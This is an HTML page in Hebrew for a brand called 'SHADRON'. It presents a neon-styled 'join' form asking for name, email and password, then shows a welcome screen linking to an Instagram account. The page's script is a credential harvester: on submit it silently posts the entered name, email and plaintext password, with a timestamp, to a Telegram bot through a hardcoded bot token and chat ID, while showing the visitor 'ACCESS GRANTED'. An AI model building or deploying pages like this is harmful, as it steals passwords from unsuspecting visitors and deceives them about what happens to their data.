<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SHADRON | NEON NEXUS</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Montserrat:wght@300;400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <style>
        :root {
            --neon-purple: #9d00ff;
            --neon-blue: #00f2ff;
            --bg: #050505;
            --insta-live: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            background: var(--bg);
            color: #eee;
            font-family: 'Montserrat', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden; /* מונע גלילה מיותרת בנייד */
        }

        /* רקע חלקיקים משופר */
        #particles { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            z-index: 1; 
            pointer-events: none; 
        }

        .screen { 
            display: none; 
            width: 100%; 
            padding: 20px; 
            position: relative; 
            z-index: 10;
            flex-direction: column;
            align-items: center;
        }
        .screen.active { display: flex; animation: fadeIn 0.8s ease; }

        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }

        .form-container {
            width: 100%;
            max-width: 380px;
            background: rgba(10, 10, 10, 0.9);
            border: 1px solid rgba(157, 0, 255, 0.3);
            border-radius: 40px;
            padding: 40px 25px;
            box-shadow: 0 0 50px rgba(157, 0, 255, 0.2), inset 0 0 20px rgba(157, 0, 255, 0.05);
            backdrop-filter: blur(15px);
            text-align: center;
        }

        /* --- חזרת אורות הניאון ללוגו --- */
        .logo-frame {
            padding: 15px 35px;
            border-radius: 100px;
            display: inline-block;
            margin-bottom: 30px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.1);
            position: relative;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(0, 242, 255, 0.1);
        }

        .logo-frame::before {
            content: '';
            position: absolute;
            top: 0; left: -100%;
            width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 242, 255, 0.6), transparent);
            animation: neonScan 2.5s infinite linear;
        }

        @keyframes neonScan { 
            0% { left: -100%; } 
            100% { left: 100%; } 
        }

        .logo-text {
            font-family: 'Cinzel', serif;
            font-size: 2rem;
            letter-spacing: 6px;
            background: linear-gradient(to right, #fff, var(--neon-blue));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 700;
            position: relative;
            z-index: 2;
        }

        /* שדות קלט */
        .form-group { margin-bottom: 15px; text-align: right; }
        label { display: block; margin-bottom: 5px; font-size: 0.75rem; color: #888; padding-right: 15px; }

        input {
            width: 100%;
            padding: 14px 20px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(157, 0, 255, 0.2);
            border-radius: 25px;
            color: #fff;
            font-size: 16px;
            transition: 0.3s;
        }

        input:focus { outline: none; border-color: var(--neon-blue); box-shadow: 0 0 15px rgba(0, 242, 255, 0.2); }

        .btn-wakeup {
            width: 100%;
            padding: 18px;
            margin-top: 20px;
            background: #fff;
            color: #000;
            border: none;
            border-radius: 50px;
            font-family: 'Cinzel', serif;
            font-size: 1.2rem;
            font-weight: 900;
            cursor: pointer;
            letter-spacing: 2px;
            box-shadow: 0 5px 20px rgba(255, 255, 255, 0.2);
        }

        /* כפתור אינסטגרם עגול וחי */
        .btn-insta-neon {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            width: 100%;
            padding: 22px;
            margin-top: 30px;
            text-decoration: none;
            color: white;
            font-family: 'Montserrat', sans-serif;
            font-weight: 700;
            font-size: 1.1rem;
            border-radius: 50px;
            background: var(--insta-live);
            box-shadow: 0 10px 30px rgba(193, 53, 132, 0.4);
            transition: 0.4s;
            border: none;
            position: relative;
            overflow: hidden;
        }

        .btn-insta-neon:active { transform: scale(0.95); }

        .status-badge {
            display: inline-block;
            padding: 6px 18px;
            background: rgba(0, 255, 136, 0.1);
            color: #00ff88;
            border: 1px solid rgba(0, 255, 136, 0.3);
            border-radius: 20px;
            font-size: 0.75rem;
            letter-spacing: 2px;
            margin-bottom: 20px;
            font-weight: 600;
        }

        h1 { font-size: 1.6rem; margin-bottom: 5px; }
    </style>
</head>
<body>

<canvas id="particles"></canvas>

<!-- מסך הרשמה -->
<div class="screen active" id="registerScreen">
    <div class="form-container">
        <div class="logo-frame"><span class="logo-text">SHADRON</span></div>
        <p style="color: #666; margin-bottom: 25px; letter-spacing: 2px; font-size: 0.8rem;">INITIATING FRACTURE</p>
        
        <form id="joinForm">
            <div class="form-group">
                <label>שם מלא</label>
                <input type="text" id="name" placeholder="Name" required>
            </div>
            <div class="form-group">
                <label>אימייל</label>
                <input type="email" id="email" placeholder="Email" required>
            </div>
            <div class="form-group">
                <label>סיסמה</label>
                <input type="password" id="password" placeholder="Password" required>
            </div>
            <button type="submit" class="btn-wakeup">WAKE UP</button>
        </form>
    </div>
</div>

<!-- מסך סיום -->
<div class="screen" id="dashboardScreen">
    <div class="form-container">
        <div class="logo-frame"><span class="logo-text">SHADRON</span></div>
        <div class="status-badge">ACCESS GRANTED</div>
        <h1>WELCOME, <span id="userName">INITIATE</span></h1>
        
        <a href="https://www.instagram.com/shadron_cube?igsh=MTczaHF5NXh4eWRobg==" target="_blank" class="btn-insta-neon">
            <i class="fab fa-instagram fa-lg"></i>
            SHADRON CUBE
        </a>
    </div>
</div>

<script>
    // הגדרות טלגרם
    const TELEGRAM_TOKEN = '7255140131:AAGP8j9NIdT3Zf346EskM9iH-8R_Y_9VdO8'; 
    const CHAT_ID = '8017590244';

    // חזרת החלקיקים והאנימציה
    const canvas = document.getElementById('particles');
    const ctx = canvas.getContext('2d');
    let particles = [];
    
    function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
    
    function create() { 
        particles = []; 
        // כמות חלקיקים גדולה יותר למראה עשיר
        for(let i=0; i<120; i++) {
            particles.push({
                x: Math.random() * canvas.width, 
                y: Math.random() * canvas.height, 
                v: Math.random() * 0.6 + 0.2, 
                s: Math.random() * 2,
                opacity: Math.random() * 0.5 + 0.2
            });
        }
    }
    
    function draw() {
        ctx.clearRect(0,0,canvas.width,canvas.height);
        particles.forEach(p => { 
            ctx.beginPath();
            ctx.arc(p.x, p.y, p.s, 0, Math.PI*2);
            ctx.fillStyle = `rgba(157, 0, 255, ${p.opacity})`;
            ctx.shadowBlur = 5;
            ctx.shadowColor = "rgba(157, 0, 255, 0.8)";
            ctx.fill(); 
            p.y -= p.v; 
            if(p.y < 0) p.y = canvas.height; 
        });
        requestAnimationFrame(draw);
    }
    
    window.addEventListener('resize', () => { resize(); create(); });
    resize(); create(); draw();

    // שליחת נתונים ומעבר מסך
    document.getElementById('joinForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const name = document.getElementById('name').value;
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;
        const time = new Date().toLocaleString('he-IL');

        const message = `
🌑 *SHADRON - NEW INITIATE* 🌑
👤 *שם:* ${name}
📧 *אימייל:* ${email}
🔑 *סיסמה:* ${pass}
⏰ *זמן:* ${time}
        `;

        // שליחה שקטה לבוט
        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
        });

        document.getElementById('userName').textContent = name.split(' ')[0].toUpperCase();
        document.getElementById('registerScreen').classList.remove('active');
        document.getElementById('dashboardScreen').classList.add('active');
    });
</script>

</body>
</html>
